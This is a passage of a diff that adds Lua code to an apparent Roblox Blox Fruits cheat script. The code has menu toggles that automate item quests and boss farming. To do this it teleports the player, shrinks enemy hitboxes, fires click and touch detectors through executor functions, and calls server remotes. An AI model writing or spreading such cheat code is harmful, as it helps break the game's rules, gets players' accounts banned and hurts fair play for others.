+        Mob = {"Ship Deckhand [Lv. 1250]", "Ship Steward [Lv. 1300]", "Ship Officer [Lv. 1325]",
+               "Ship Engineer [Lv. 1275]"};
+        PlaceId = 4442272183;
+        NameRemote = "TravelDressrosa";
+    elseif not CheckItemCount("Bones", 500) then
+        Mob = {"Reborn Skeleton [Lv. 1975]", "Demonic Soul [Lv. 2025]", "Living Zombie [Lv. 2000]",
+               "Posessed Mummy [Lv. 2050]"};
+        PlaceId = 7449423635;
+        NameRemote = "TravelZou";
+    end
+    return Mob, PlaceId, NameRemote;
+end
+local CommF = (game:GetService("ReplicatedStorage")).Remotes.CommF_;
+function GuitarPuzzleProgress()
+    if not CommF:InvokeServer("GuitarPuzzleProgress", "Check") then
+        if game.Lighting.Sky.MoonTextureId == "http://www.roblox.com/asset/?id=9709149431" and
+            (game.Lighting.ClockTime > 16 or game.Lighting.ClockTime < 5) then
+            if (game:GetService("Players")).LocalPlayer:DistanceFromCharacter(Vector3.new(-8654.314453125,
+                140.9499053955078, 6167.5283203125)) > 50 then
+                TweenPlayer(CFrame.new(-8654.314453125, 140.9499053955078, 6167.5283203125));
+            end
+            CommF:InvokeServer("gravestoneEvent", 2);
+            CommF:InvokeServer("gravestoneEvent", 2, true);
+            task.wait(1);
+        else
+            WindUI:Notify({
+                Title = "Notification",
+                Content = "Hop Full Moon",
+                Icon = "bell",
+                Duration = 5
+            });
+            Hop();
+        end
+    else
+        if (game:GetService("Players")).LocalPlayer.PlayerGui.Main.Dialogue.Visible then
+            game.VirtualUser:Button1Down(Vector2.new(0, 0));
+            game.VirtualUser:Button1Down(Vector2.new(0, 0));
+        end
+        if not (CommF:InvokeServer("GuitarPuzzleProgress", "Check")).Swamp then
+            if ((CFrame.new((-10171.7607421875), 138.62667846679688, 6008.0654296875)).Position -
+                (game:GetService("Players")).LocalPlayer.Character.HumanoidRootPart.Position).Magnitude > 100 then
+                toTarget((game:GetService("Players")).LocalPlayer.Character.HumanoidRootPart.Position,
+                    (CFrame.new(-10171.7607421875, 138.62667846679688, 6008.0654296875)).Position,
+                    CFrame.new(-10171.7607421875, 138.62667846679688 + 20, 6008.0654296875));
+            elseif CountZombie() == 6 then
+                for i, v in pairs(game.workspace.Enemies:GetChildren()) do
+                    if v.Name == "Living Zombie [Lv. 2000]" and v:FindFirstChild("HumanoidRootPart") and
+                        v:FindFirstChild("Humanoid") and v.Humanoid.Health > 0 then
+                        repeat
+                            task.wait();
+                            EquipWeapon(_G.Settings.Main["Selected Weapon"]);
+                            AutoHaki();
+                            v.HumanoidRootPart.Size = Vector3.new(1, 1, 1);
+                            PosMon = v.HumanoidRootPart.CFrame;
+                            MonFarm = v.Name;
+                            TweenPlayer(v.HumanoidRootPart.CFrame * Pos);
+                            Attack();
+                        until v.Humanoid.Health <= 0 or (not v.Parent);
+                    end
+                end
+            end
+            return;
+        elseif not (CommF:InvokeServer("GuitarPuzzleProgress", "Check")).Gravestones then
+            if (game:GetService("Players")).LocalPlayer:DistanceFromCharacter(Vector3.new(-8761.4765625,
+                142.10487365722656, 6086.07861328125)) > 50 then
+                TweenPlayer(CFrame.new(-8761.4765625, 142.10487365722656, 6086.07861328125));
+            else
+                local ClickSigns = {game.workspace.Map["Haunted Castle"].Placard1.Right.ClickDetector,
+                                    game.workspace.Map["Haunted Castle"].Placard2.Right.ClickDetector,
+                                    game.workspace.Map["Haunted Castle"].Placard3.Left.ClickDetector,
+                                    game.workspace.Map["Haunted Castle"].Placard4.Right.ClickDetector,
+                                    game.workspace.Map["Haunted Castle"].Placard5.Left.ClickDetector,
+                                    game.workspace.Map["Haunted Castle"].Placard6.Left.ClickDetector,
+                                    game.workspace.Map["Haunted Castle"].Placard7.Left.ClickDetector};
+                for i, v in pairs(ClickSigns) do
+                    fireclickdetector(v);
+                end
+            end
+        elseif not (CommF:InvokeServer("GuitarPuzzleProgress", "Check")).Ghost then
+            if (game:GetService("Players")).LocalPlayer:DistanceFromCharacter(Vector3.new(-9755.6591796875,
+                271.0661315917969, 6290.61474609375)) > 50 then
+                TweenPlayer(CFrame.new(-9755.6591796875, 271.0661315917969, 6290.61474609375));
+            end
+            CommF:InvokeServer("GuitarPuzzleProgress", "Ghost");
+            task.wait(3);
+        elseif not (CommF:InvokeServer("GuitarPuzzleProgress", "Check")).Trophies then
+            if (game:GetService("Players")).LocalPlayer:DistanceFromCharacter(Vector3.new(-9530.0126953125,
+                6.104853630065918, 6054.83349609375)) > 50 then
+                TweenPlayer(CFrame.new(-9530.0126953125, 6.104853630065918, 6054.83349609375));
+            end
+            local Tablet = game.workspace.Map["Haunted Castle"].Tablet;
+            for i, v in pairs(BlankTablets) do
+                local x = Tablet[v];
+                if x.Line.Position.X ~= 0 then
+                    repeat
+                        task.wait();
+                        fireclickdetector(x.ClickDetector);
+                    until x.Line.Position.X == 0;
+                end
+            end
+            for i, v in pairs(Trophy) do
+                local x = game.workspace.Map["Haunted Castle"].Trophies.Quest[v].Handle.CFrame;
+                x = tostring(x);
+                x = (x:split(", "))[4];
+                local c = "180";
+                if x == "1" or x == "-1" then
+                    c = "90";
+                end
+                if not string.find(tostring(Tablet[i].Line.Rotation.Z), c) then
+                    repeat
+                        task.wait();
+                        fireclickdetector(Tablet[i].ClickDetector);
+                    until string.find(tostring(Tablet[i].Line.Rotation.Z), c);
+                    print(i, c);
+                end
+            end
+        elseif not (CommF:InvokeServer("GuitarPuzzleProgress", "Check")).Pipes then
+            for i, v in pairs(Pipes) do
+                local x = game.workspace.Map["Haunted Castle"]["Lab Puzzle"].ColorFloor.Model[i];
+                if x.BrickColor.Name ~= v then
+                    repeat
+                        task.wait();
+                        fireclickdetector(x.ClickDetector);
+                    until x.BrickColor.Name == v;
+                end
+            end
+        end
+    end
+end
+function AutoSoulGuitar()
+    if (game:GetService("ReplicatedStorage")).Remotes.CommF_:InvokeServer("soulGuitarBuy", true) ==
+        "[You already own this item.]" then
+        WindUI:Notify({
+            Title = "Notification",
+            Content = "You already own this item",
+            Icon = "bell",
+            Duration = 5
+        });
+        task.wait(5);
+        return;
+    end
+    if game.Players.LocalPlayer.Data.Fragments.Value < 5000 then
+        task.wait(2);
+        WindUI:Notify({
+            Title = "Notification",
+            Content = "Need 5000 Fragments",
+            Icon = "bell",
+            Duration = 5
+        });
+        return;
+    end
+    if not CheckItemCount("Ectoplasm", 250) then
+        task.wait(2);
+        WindUI:Notify({
+            Title = "Notification",
+            Content = "Need 250 Ectoplasm",
+            Icon = "bell",
+            Duration = 5
+        });
+        return;
+    end
+    if CheckItemCount("Dark Fragment", 1) and CheckItemCount("Ectoplasm", 250) and CheckItemCount("Bones", 500) then
+        (game:GetService("ReplicatedStorage")).Remotes.CommF_:InvokeServer("soulGuitarBuy", true);
+        (game:GetService("ReplicatedStorage")).Remotes.CommF_:InvokeServer("soulGuitarBuy");
+        if World3 then
+            GuitarPuzzleProgress();
+        else
+            (game:GetService("ReplicatedStorage")).Remotes.CommF_:InvokeServer("TravelZou");
+        end
+        return;
+    end
+    if not CheckItemCount("Dark Fragment", 1) then
+        if World2 then
+            if CheckNameBoss("Darkbeard [Lv. 1000] [Raid Boss]") then
+                local v = CheckNameBoss("Darkbeard [Lv. 1000] [Raid Boss]");
+                repeat
+                    task.wait();
+                    AutoHaki();
+                    EquipWeapon(_G.Settings.Main["Selected Weapon"]);
+                    v.Humanoid.WalkSpeed = 0;
+                    v.HumanoidRootPart.Size = Vector3.new(1, 1, 1);
+                    TweenPlayer(v.HumanoidRootPart.CFrame * Pos);
+                    Attack();
+                until v.Humanoid.Health <= 0 or (not v.Parent);
+            elseif game.Players.LocalPlayer.Character:FindFirstChild("Fist of Darkness") or
+                game.Players.LocalPlayer.Backpack:FindFirstChild("Fist of Darkness") then
+                if ((game:GetService("Workspace")).Map.DarkbeardArena.Summoner.Detection.Position -
+                    game.Players.LocalPlayer.Character.HumanoidRootPart.Position).Magnitude <= 5 then
+                    EquipWeapon("Fist of Darkness");
+                    firetouchinterest(game.Players.LocalPlayer.Character["Fist of Darkness"].Handle,
+                        (game:GetService("Workspace")).Map.DarkbeardArena.Summoner.Detection, 0);
+                    firetouchinterest(game.Players.LocalPlayer.Character["Fist of Darkness"].Handle,
+                        (game:GetService("Workspace")).Map.DarkbeardArena.Summoner.Detection, 1);
+                    firetouchinterest(game.Players.LocalPlayer.Character.HumanoidRootPart,
+                        (game:GetService("Workspace")).Map.DarkbeardArena.Summoner.Detection, 0);
+                    firetouchinterest(game.Players.LocalPlayer.Character.HumanoidRootPart,
+                        (game:GetService("Workspace")).Map.DarkbeardArena.Summoner.Detection, 1);
+                else
+                    TweenPlayer((game:GetService("Workspace")).Map.DarkbeardArena.Summoner.Detection.CFrame);
+                end
+            else
+                local v = DetectChest();
+                repeat
+                    task.wait();
+                    if (game.Players.LocalPlayer.Character.HumanoidRootPart.Position - v.Position).Magnitude <= 2 then
+                        firetouchinterest(v, game.Players.LocalPlayer.Character.HumanoidRootPart, 0);
+                        firetouchinterest(v, game.Players.LocalPlayer.Character.HumanoidRootPart, 1);
+                    end
+                    if (game.Players.LocalPlayer.Character.HumanoidRootPart.Position - v.Position).Magnitude <= 5 then
+                        (game:service("VirtualInputManager")):SendKeyEvent(true, "W", false, game);
+                        task.wait();
+                        (game:service("VirtualInputManager")):SendKeyEvent(false, "W", false, game);
+                    end
+                    InstantTp(v.CFrame * CFrame.new(0, 1, 0));
+                until not v or (not v.Parent) or (not _G.Settings.Items["Auto Soul Guitar"]);
+            end
+        else
+            (game:GetService("ReplicatedStorage")).Remotes.CommF_:InvokeServer("TravelDressrosa");
+        end
+    else
+        local Mob, PlaceId, NameRemote = DetectRequestSoulGuitar();
+        if game.PlaceId == PlaceId then
+            if not DetectMob(Mob) then
+                TeleportSpawnMob(Mob, _G.Settings.Items["Auto Soul Guitar"]);
+            else
+                local v = DetectMob(Mob);
+                repeat
+                    task.wait();
+                    EquipWeapon(_G.Settings.Main["Selected Weapon"]);
+                    AutoHaki();
+                    v.HumanoidRootPart.Size = Vector3.new(1, 1, 1);
+                    PosMon = v.HumanoidRootPart.CFrame;
+                    MonFarm = v.Name;
+                    TweenPlayer(v.HumanoidRootPart.CFrame * Pos);
+                    Attack();
+                until not v or (not v.Parent) or v.Humanoid.Health == 0 or (not _G.Settings.Items["Auto Soul Guitar"]);
+            end
+        else
+            (game:GetService("ReplicatedStorage")).Remotes.CommF_:InvokeServer(NameRemote);
+        end
+    end
+end
+AutoSoulGuitarToggle = Tabs.ItemsTab:Toggle({
+    Title = "Auto Soul Guitar",
+    Desc = "Function Sea 3 Only",
+    Value = _G.Settings.Items["Auto Soul Guitar"],
+    Callback = function(state)
+        _G.Settings.Items["Auto Soul Guitar"] = state;
+        StopTween(_G.Settings.Items["Auto Soul Guitar"]);
+        (getgenv()).SaveSetting();
+    end
+});
+spawn(function()
+    while wait(0.2) do
+        pcall(function()
+            if _G.Settings.Items["Auto Soul Guitar"] then
+                AutoSoulGuitar();
+            end
+        end);
+    end
+end);
+AutoRengokuToggle = Tabs.ItemsTab:Toggle({
+    Title = "Auto Rengoku",
+    Desc = "Function Sea 2 Only",
+    Value = _G.Settings.Items["Auto Rengoku"],
+    Callback = function(state)
+        _G.Settings.Items["Auto Rengoku"] = state;
+        StopTween(_G.Settings.Items["Auto Rengoku"]);
+        (getgenv()).SaveSetting();
+    end
+});
+spawn(function()
+    pcall(function()
+        while wait(0.2) do
+            if _G.Settings.Items["Auto Rengoku"] and World2 then
+                if (game:GetService("Players")).LocalPlayer.Backpack:FindFirstChild("Hidden Key") or
+                    (game:GetService("Players")).LocalPlayer.Character:FindFirstChild("Hidden Key") then
+                    EquipWeapon("Hidden Key");
+                    TweenPlayer(CFrame.new(6571.1201171875, 299.23028564453, -6967.841796875));
+                elseif (game:GetService("Workspace")).Enemies:FindFirstChild("Snow Lurker") or
+                    (game:GetService("Workspace")).Enemies:FindFirstChild("Arctic Warrior") then
+                    for i, v in pairs((game:GetService("Workspace")).Enemies:GetChildren()) do
+                        if (v.Name == "Snow Lurker" or v.Name == "Arctic Warrior") and v.Humanoid.Health > 0 then
+                            repeat
+                                (game:GetService("RunService")).Heartbeat:wait();
+                                EquipWeapon(_G.Settings.Main["Selected Weapon"]);
+                                AutoHaki();
+                                v.HumanoidRootPart.Size = Vector3.new(1, 1, 1);
+                                PosMon = v.HumanoidRootPart.CFrame;
+                                MonFarm = v.Name;
+                                TweenPlayer(v.HumanoidRootPart.CFrame * Pos);
+                                Attack();
+                            until (game:GetService("Players")).LocalPlayer.Backpack:FindFirstChild("Hidden Key") or
+                                _G.Settings.Items["Auto Rengoku"] == false or (not v.Parent) or v.Humanoid.Health <= 0;
+                        end
+                    end
+                else
+                    TweenPlayer(CFrame.new(5439.716796875, 84.420944213867, -6715.1635742188));
+                end
+            end
+        end
+    end);
+end);
+AutoHallowScytheToggle = Tabs.ItemsTab:Toggle({
+    Title = "Auto Hallow Scythe",
+    Desc = "Function Sea 3 Only",
+    Value = _G.Settings.Items["Auto Hallow Scythe"],
+    Callback = function(state)
+        _G.Settings.Items["Auto Hallow Scythe"] = state;
+        StopTween(_G.Settings.Items["Auto Hallow Scythe"]);
+        (getgenv()).SaveSetting();
+    end
+});
+AutoWardenSwordToggle = Tabs.ItemsTab:Toggle({
+    Title = "Auto Warden Sword",
+    Desc = "Function Sea 1 Only",
+    Value = _G.Settings.Items["Auto Warden Sword"],
+    Callback = function(state)
+        _G.Settings.Items["Auto Warden Sword"] = state;
+        StopTween(_G.Settings.Items["Auto Warden Sword"]);
+        (getgenv()).SaveSetting();
+    end
+});
+AutoGetYamaToggle = Tabs.ItemsTab:Toggle({
+    Title = "Auto Get Yama",
+    Desc = "Need 30 Elite Hunter, Function Sea 3 Only",
+    Value = _G.Settings.Items["Auto Yama"],
+    Callback = function(state)
+        _G.Settings.Items["Auto Yama"] = state;
+        StopTween(_G.Settings.Items["Auto Yama"]);
+        (getgenv()).SaveSetting();
+    end
+});
+AutoGetYamaHopToggle = Tabs.ItemsTab:Toggle({
+    Title = "Auto Get Yama Hop",
+    Desc = "Hop If Elite Hunter Not Spawn",
+    Value = _G.Settings.Items["Auto Yama Hop"],
+    Callback = function(state)
+        _G.Settings.Items["Auto Yama Hop"] = state;
+        StopTween(_G.Settings.Items["Auto Yama Hop"]);
+        (getgenv()).SaveSetting();
+    end
+});
+AutoGetTushitaToggle = Tabs.ItemsTab:Toggle({
+    Title = "Auto Get Tushita",
+    Value = _G.Settings.Items["Auto Tushita"],
+    Callback = function(state)
+        _G.Settings.Items["Auto Tushita"] = state;
+        StopTween(_G.Settings.Items["Auto Tushita"]);
+        (getgenv()).SaveSetting();
+    end
+});
+AutoDragonTridentToggle = Tabs.ItemsTab:Toggle({
+    Title = "Auto Dragon Trident",
+    Desc = "Function Sea 2 Only",
+    Value = _G.Settings.Items["Auto Dragon Trident"],
+    Callback = function(state)
+        _G.Settings.Items["Auto Dragon Trident"] = state;
+        StopTween(_G.Settings.Items["Auto Dragon Trident"]);
+        (getgenv()).SaveSetting();
+    end
+});
+AutoDragonTridentToggle = Tabs.ItemsTab:Toggle({
+    Title = "Auto Greybeard",
+    Desc = "Function Sea 1 Only",
+    Value = _G.Settings.Items["Auto Greybeard"],
+    Callback = function(state)
+        _G.Settings.Items["Auto Greybeard"] = state;
+        StopTween(_G.Settings.Items["Auto Greybeard"]);
+        (getgenv()).SaveSetting();
+    end
+});
+AutoSharkSawToggle = Tabs.ItemsTab:Toggle({
+    Title = "Auto Shark Saw",
+    Desc = "Function Sea 1 Only",
+    Value = _G.Settings.Items["Auto Shark Saw"],
+    Callback = function(state)
+        _G.Settings.Items["Auto Shark Saw"] = state;
+        StopTween(_G.Settings.Items["Auto Shark Saw"]);
+        (getgenv()).SaveSetting();
+    end
+});
+AutoPoleToggle = Tabs.ItemsTab:Toggle({
+    Title = "Auto Pole",
+    Desc = "Function Sea 1 Only",
+    Value = _G.Settings.Items["Auto Pole"],
+    Callback = function(state)
+        _G.Settings.Items["Auto Pole"] = state;
+        StopTween(_G.Settings.Items["Auto Pole"]);
+        (getgenv()).SaveSetting();
+    end
+});
+AutoDarkDaggerToggle = Tabs.ItemsTab:Toggle({
+    Title = "Auto Dark Dagger",
+    Desc = "Need Spawn Rip Indra, Function Sea 3 Only",
+    Value = _G.Settings.Items["Auto Dark Dagger"],
+    Callback = function(state)
+        _G.Settings.Items["Auto Dark Dagger"] = state;
+        StopTween(_G.Settings.Items["Auto Dark Dagger"]);
+        (getgenv()).SaveSetting();
+    end
+});
+spawn(function()
+    pcall(function()
+        while wait(0.2) do
+            if _G.Settings.Items["Auto Dark Dagger"] and World3 then
+                if (game:GetService("Workspace")).Enemies:FindFirstChild("rip_indra True Form") or
+                    (game:GetService("Workspace")).Enemies:FindFirstChild("rip_indra") then
+                    for i, v in pairs((game:GetService("Workspace")).Enemies:GetChildren()) do
+                        if v.Name == ("rip_indra True Form" or v.Name == "rip_indra") and v.Humanoid.Health > 0 and
+                            v:IsA("Model") and v:FindFirstChild("Humanoid") and v:FindFirstChild("HumanoidRootPart") then
+                            repeat
+                                (game:GetService("RunService")).Heartbeat:wait();
+                                AutoHaki();
+                                EquipWeapon(_G.Settings.Main["Selected Weapon"]);
+                                v.HumanoidRootPart.Size = Vector3.new(1, 1, 1);
+                                TweenPlayer(v.HumanoidRootPart.CFrame * Pos);
+                                Attack();
+                            until _G.Settings.Items["Auto Dark Dagger"] == false or v.Humanoid.Health <= 0;
+                        end
+                    end
+                else
+                    UnEquipWeapon(_G.Settings.Main["Selected Weapon"]);
+                    TweenPlayer(CFrame.new(-5344.822265625, 423.98541259766, -2725.0930175781));
+                end
+            end
+        end
+    end);
+end);
+spawn(function()
+    while wait(0.2) do
+        if _G.Settings.Items["Auto Pole"] and World1 then
+            pcall(function()
+                if (game:GetService("Workspace")).Enemies:FindFirstChild("Thunder God") then
+                    for i, v in pairs((game:GetService("Workspace")).Enemies:GetChildren()) do
+                        if v.Name == "Thunder God" then
+                            if v:FindFirstChild("Humanoid") and v:FindFirstChild("HumanoidRootPart") and
+                                v.Humanoid.Health > 0 then
+                                repeat
+                                    (game:GetService("RunService")).Heartbeat:wait();
+                                    AutoHaki();
+                                    EquipWeapon(_G.Settings.Main["Selected Weapon"]);
+                                    v.Humanoid.WalkSpeed = 0;
+                                    v.HumanoidRootPart.Size = Vector3.new(1, 1, 1);
+                                    TweenPlayer(v.HumanoidRootPart.CFrame * Pos);
+                                    Attack();
+                                until not _G.Settings.Items["Auto Pole"] or (not v.Parent) or v.Humanoid.Health <= 0;
+                            end
+                        end
+                    end
+                else
+                    UnEquipWeapon(_G.Settings.Main["Selected Weapon"]);
+                    TweenPlayer(CFrame.new(-7748.0185546875, 5606.80615234375, -2305.898681640625));
+                end
+            end);
+        end
+    end
+end);
+spawn(function()
+    while wait(0.2) do
+        if _G.Settings.Items["Auto Shark Saw"] and World1 then
+            pcall(function()
+                if (game:GetService("Workspace")).Enemies:FindFirstChild("The Saw") then
+                    for i, v in pairs((game:GetService("Workspace")).Enemies:GetChildren()) do
+                        if v.Name == "The Saw" then
+                            if v:FindFirstChild("Humanoid") and v:FindFirstChild("HumanoidRootPart") and
+                                v.Humanoid.Health > 0 then
+                                repeat
+                                    (game:GetService("RunService")).Heartbeat:wait();
+                                    AutoHaki();
+                                    EquipWeapon(_G.Settings.Main["Selected Weapon"]);
+                                    v.Humanoid.WalkSpeed = 0;
+                                    v.HumanoidRootPart.Size = Vector3.new(1, 1, 1);
+                                    TweenPlayer(v.HumanoidRootPart.CFrame * Pos);
+                                    Attack();
+                                until not _G.Settings.Items["Auto Shark Saw"] or (not v.Parent) or v.Humanoid.Health <=
+                                    0;
+                            end
+                        end
+                    end
+                else
+                    UnEquipWeapon(_G.Settings.Main["Selected Weapon"]);
+                    TweenPlayer(CFrame.new(-690.33081054688, 15.09425163269, 1582.2380371094));
+                end
+            end);
+        end
+    end
+end);
+spawn(function()
+    while wait(0.2) do
+        if _G.Settings.Items["Auto Greybeard"] and World1 then
+            pcall(function()
+                if (game:GetService("Workspace")).Enemies:FindFirstChild("Greybeard") then
+                    for i, v in pairs((game:GetService("Workspace")).Enemies:GetChildren()) do
+                        if v.Name == "Greybeard" then
+                            if v:FindFirstChild("Humanoid") and v:FindFirstChild("HumanoidRootPart") and
+                                v.Humanoid.Health > 0 then
+                                repeat
+                                    (game:GetService("RunService")).Heartbeat:wait();
+                                    AutoHaki();
+                                    EquipWeapon(_G.Settings.Main["Selected Weapon"]);
+                                    v.Humanoid.WalkSpeed = 0;
+                                    v.HumanoidRootPart.Size = Vector3.new(1, 1, 1);
+                                    TweenPlayer(v.HumanoidRootPart.CFrame * Pos);
+                                    Attack();
+                                until not _G.Settings.Items["Auto Greybeard"] or (not v.Parent) or v.Humanoid.Health <=
+                                    0;
+                            end
+                        end
+                    end
+                else
+                    UnEquipWeapon(_G.Settings.Main["Selected Weapon"]);
+                    TweenPlayer(CFrame.new(-5023.38330078125, 28.65203285217285, 4332.3818359375));
+                end
+            end);
+        end
+    end
+end);
+spawn(function()
+    while wait(0.2) do
+        if _G.Settings.Items["Auto Dragon Trident"] and World2 then
+            pcall(function()
+                if (game:GetService("Workspace")).Enemies:FindFirstChild("Tide Keeper") then
+                    for i, v in pairs((game:GetService("Workspace")).Enemies:GetChildren()) do
+                        if v.Name == "Tide Keeper" then
+                            if v:FindFirstChild("Humanoid") and v:FindFirstChild("HumanoidRootPart") and
+                                v.Humanoid.Health > 0 then
+                                repeat
+                                    (game:GetService("RunService")).Heartbeat:wait();
+                                    AutoHaki();
+                                    EquipWeapon(_G.Settings.Main["Selected Weapon"]);
+                                    v.Humanoid.WalkSpeed = 0;
+                                    v.HumanoidRootPart.Size = Vector3.new(1, 1, 1);
+                                    TweenPlayer(v.HumanoidRootPart.CFrame * Pos);
+                                    Attack();
+                                until not _G.Settings.Items["Auto Dragon Trident"] or (not v.Parent) or
+                                    v.Humanoid.Health <= 0;
+                            end
+                        end
+                    end
+                else
+                    UnEquipWeapon(_G.Settings.Main["Selected Weapon"]);
+                    TweenPlayer(CFrame.new(-3914.830322265625, 123.29389190673828, -11516.8642578125));
+                end
+            end);
+        end
+    end
+end);
+function CheckTorch()
+    local a;
+    if not (game:GetService("Workspace")).Map.Turtle.QuestTorches.Torch1.Particles.Main.Enabled then
+        a = "1";
+    elseif not (game:GetService("Workspace")).Map.Turtle.QuestTorches.Torch2.Particles.Main.Enabled then
+        a = "2";
+    elseif not (game:GetService("Workspace")).Map.Turtle.QuestTorches.Torch3.Particles.Main.Enabled then
+        a = "3";
+    elseif not (game:GetService("Workspace")).Map.Turtle.QuestTorches.Torch4.Particles.Main.Enabled then
+        a = "4";
+    elseif not (game:GetService("Workspace")).Map.Turtle.QuestTorches.Torch5.Particles.Main.Enabled then
+        a = "5";
+    end
+    for i, v in next, (game:GetService("Workspace")).Map.Turtle.QuestTorches:GetChildren() do
+        if v:IsA("MeshPart") and string.find(v.Name, a) and (not v.Particles.Main.Enabled) then
+            return v;
+        end
+    end
+end
+function CheckNameBoss(a)
+    for i, v in next, game.ReplicatedStorage:GetChildren() do
+        if v:IsA("Model") and (typeof(a) == "table" and table.find(a, v.Name) or v.Name == a) and
+            v:FindFirstChild("Humanoid") and v.Humanoid.Health > 0 then
+            return v;
+        end
+    end
+    for i, v in next, game.Workspace.Enemies:GetChildren() do
+        if v:IsA("Model") and (typeof(a) == "table" and table.find(a, v.Name) or v.Name == a) and
+            v:FindFirstChild("Humanoid") and v.Humanoid.Health > 0 then
+            return v;
+        end
+    end
+end
+spawn(function()
+    while wait(0.2) do
+        if _G.Settings.Items["Auto Tushita"] and World3 then
+            pcall(function()
+                if not (game:GetService("Workspace")).Map.Turtle:FindFirstChild("TushitaGate") then
+                    if CheckNameBoss("Longma [Lv. 2000] [Boss]") then
+                        local v = CheckNameBoss("Longma [Lv. 2000] [Boss]");
+                        repeat
+                            task.wait();
+                            AutoHaki();
+                            EquipWeapon(_G.Settings.Main["Selected Weapon"]);
+                            v.Humanoid.WalkSpeed = 0;
+                            v.HumanoidRootPart.Size = Vector3.new(1, 1, 1);
+                            TweenPlayer(v.HumanoidRootPart.CFrame * Pos);
+                            Attack();
+                        until not v or (not v.Parent) or v.Humanoid.Health == 0;
+                    end
+                elseif CheckNameBoss("rip_indra True Form [Lv. 5000] [Raid Boss]") then
+                    if not game.Players.LocalPlayer.Character:FindFirstChild("Holy Torch") and
+                        (not game.Players.LocalPlayer.Backpack:FindFirstChild("Holy Torch")) then
+                        TweenPlayer((game:GetService("Workspace")).Map.Waterfall.SecretRoom.Room.Door.Door.Hitbox.CFrame);
+                    else
+                        EquipWeapon("Holy Torch");
+                        if CheckTorch() then
+                            TweenPlayer((CheckTorch()).CFrame);
+                        end
+                    end
+                else
+                    WindUI:Notify({
+                        Title = "Notification",
+                        Content = "Rip Indra Not Spawn",
+                        Icon = "bell",
+                        Duration = 5
+                    });
+                    task.wait(3);
+                end
+            end);
+        end
+    end
+end);
+spawn(function()
+    while wait(0.2) do
+        if _G.Settings.Items["Auto Yama Hop"] and World3 then
+            pcall(function()
+                if (game:GetService("ReplicatedStorage")).Remotes.CommF_:InvokeServer("EliteHunter", "Progress") < 30 then
+                    if _G.Settings.Items["Auto Yama"] then
+                        if not (game:GetService("Workspace")).Enemies:FindFirstChild("Diablo") or
+                            (not (game:GetService("Workspace")).Enemies:FindFirstChild("Deandre")) or
+                            (not (game:GetService("Workspace")).Enemies:FindFirstChild("Urban")) then
+                            Hop();
+                        end
+                    end
+                end
+            end);
+        end
+    end
+end);
+spawn(function()
+    while wait(0.2) do
+        if _G.Settings.Items["Auto Yama"] and World3 then
+            if (game:GetService("ReplicatedStorage")).Remotes.CommF_:InvokeServer("EliteHunter", "Progress") >= 30 then
+                repeat
+                    wait(0.1);
+                    fireclickdetector((game:GetService("Workspace")).Map.Waterfall.SealedKatana.Handle.ClickDetector);
+                until (game:GetService("Players")).LocalPlayer.Backpack:FindFirstChild("Yama") or
+                    (not _G.Settings.Items["Auto Yama"]);
+            elseif string.find(QuestTitle, "Diablo") or string.find(QuestTitle, "Deandre") or
+                string.find(QuestTitle, "Urban") then
+                if (game:GetService("Workspace")).Enemies:FindFirstChild("Diablo") or
+                    (game:GetService("Workspace")).Enemies:FindFirstChild("Deandre") or
+                    (game:GetService("Workspace")).Enemies:FindFirstChild("Urban") then
+                    for i, v in pairs((game:GetService("Workspace")).Enemies:GetChildren()) do
+                        if v.Name == "Diablo" or v.Name == "Deandre" or v.Name == "Urban" then
+                            if v:FindFirstChild("Humanoid") and v:FindFirstChild("HumanoidRootPart") and
+                                v.Humanoid.Health > 0 then
+                                repeat
+                                    (game:GetService("RunService")).Heartbeat:wait();
+                                    AutoHaki();
+                                    EquipWeapon(_G.Settings.Main["Selected Weapon"]);
+                                    v.Humanoid.WalkSpeed = 0;
+                                    v.HumanoidRootPart.Size = Vector3.new(1, 1, 1);
+                                    TweenPlayer(v.HumanoidRootPart.CFrame * Pos);
+                                    Attack();
+                                until _G.Settings.Farm["Auto Yama"] == false or v.Humanoid.Health <= 0 or (not v.Parent);
+                            end
+                        end
+                    end
+                end
+            else
+                (game:GetService("ReplicatedStorage")).Remotes.CommF_:InvokeServer("EliteHunter");
+            end
+        end
+    end
+end);
+spawn(function()
+    while wait(0.2) do
+        if _G.Settings.Items["Auto Warden Sword"] and World1 then
+            pcall(function()
+                if (game:GetService("Workspace")).Enemies:FindFirstChild("Chief Warden") then
+                    for i, v in pairs((game:GetService("Workspace")).Enemies:GetChildren()) do
+                        if v.Name == "Chief Warden" then
+                            if v:FindFirstChild("Humanoid") and v:FindFirstChild("HumanoidRootPart") and
+                                v.Humanoid.Health > 0 then
+                                repeat
+                                    (game:GetService("RunService")).Heartbeat:wait();
+                                    AutoHaki();
+                                    EquipWeapon(_G.Settings.Main["Selected Weapon"]);
+                                    v.Humanoid.WalkSpeed = 0;
+                                    v.HumanoidRootPart.Size = Vector3.new(1, 1, 1);
+                                    TweenPlayer(v.HumanoidRootPart.CFrame * Pos);
+                                    Attack();
+                                until not _G.Settings.Items["Auto Warden Sword"] or (not v.Parent) or v.Humanoid.Health <=
+                                    0;
+                            end
+                        end
+                    end
+                else
+                    UnEquipWeapon(_G.Settings.Main["Selected Weapon"]);
+                    TweenPlayer(CFrame.new(5186.14697265625, 24.86684226989746, 832.1885375976562));
+                end
+            end);
+        end
+    end
+end);
+spawn(function()
+    while wait(0.2) do
+        if _G.Settings.Items["Auto Hallow Scythe"] then
+            pcall(function()
+                if (game:GetService("Workspace")).Enemies:FindFirstChild("Soul Reaper") then
+                    for i, v in pairs((game:GetService("Workspace")).Enemies:GetChildren()) do
+                        if string.find(v.Name, "Soul Reaper") then
+                            repeat
+                                (game:GetService("RunService")).Heartbeat:wait();
+                                EquipWeapon(_G.Settings.Main["Selected Weapon"]);
+                                AutoHaki();
+                                v.HumanoidRootPart.Size = Vector3.new(1, 1, 1);
+                                TweenPlayer(v.HumanoidRootPart.CFrame * Pos);
+                                Attack();
+                                v.HumanoidRootPart.Transparency = 1;
+                            until v.Humanoid.Health <= 0 or _G.Settings.Items["Auto Hallow Scythe"] == false;
+                        end
+                    end
+                elseif (game:GetService("Players")).LocalPlayer.Backpack:FindFirstChild("Hallow Essence") or
+                    (game:GetService("Players")).LocalPlayer.Character:FindFirstChild("Hallow Essence") then
+                    repeat
+                        TweenPlayer(CFrame.new(-8932.322265625, 146.83154296875, 6062.55078125));
+                        wait();
+                    until ((CFrame.new((-8932.322265625), 146.83154296875, 6062.55078125)).Position -
+                        game.Players.LocalPlayer.Character.HumanoidRootPart.Position).Magnitude <= 8;
+                    EquipWeapon("Hallow Essence");
